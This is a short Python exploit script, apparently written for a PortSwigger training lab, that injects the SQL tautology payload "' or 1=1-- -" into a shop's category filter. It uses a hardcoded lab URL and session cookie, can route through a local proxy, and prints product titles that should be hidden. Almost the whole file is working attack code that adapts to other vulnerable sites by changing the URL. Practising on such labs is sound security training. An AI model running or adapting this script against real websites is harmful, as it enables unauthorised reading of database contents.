#!/usr/bin/env python3 

# Author: COMANMDRE-EX  . IRVING ST...
# Exploit sql vulnerability to show articles in production with SQL injection ' or 1=1-- - from portswigger lab one

from colorama  import Fore,Style  
from bs4 import BeautifulSoup
import  sys,signal,time,requests
from  pwn import *

def def_handler(sig, frame):
    print(Fore.RED  + Style.BRIGHT  + "{}".format("\n\nExiting...\n"))
    sys.exit(1)

signal.signal(signal.SIGINT,  def_handler)

payload  = "' or 1=1-- -"
url  = "https://0a31006503f04b62c1dce902008a004e.web-security-academy.net/filter?"
# Proxys  
proxys = {
        "http":"http://127.0.0.1:8080",
        "https":"https://127.0.0.1:8080"
        }

def def_injection():

    session = requests.Session()
    paramsGet = {"category":"Pets %s" % payload}
    cookies = {"session":"nvX45Omzynq8Y6EmKryfpVvnWAfcZeiV"}
    response = session.get(url, params=paramsGet, cookies=cookies)

    if  response.status_code  == 200:
        print(response.status_code)
        soup = BeautifulSoup(response.content, 'html.parser')
        for h3 in soup.find_all('h3'):
            print(Fore.BLUE  + Style.BRIGHT + "items in production: %s" %  h3.text)


p1 =  log.progress(Fore.RED  + Style.BRIGHT + " Inyectando  %s " % payload)
time.sleep(10)


if __name__  ==  '__main__':
    exploit = def_injection()

